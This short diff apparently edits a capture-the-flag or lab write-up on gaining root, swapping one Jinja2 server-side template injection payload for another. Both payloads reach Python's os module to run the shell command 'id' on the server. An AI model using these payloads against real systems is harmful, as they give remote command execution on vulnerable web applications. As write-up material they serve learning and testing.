@@ -244,7 +244,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 We are root.
 
-A
+Aa
 ```
-{{''.__class__.__base__.__subclasses__()[141].__init__.__globals__['sys'].modules['os'].popen("id").read()}}
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
 ```
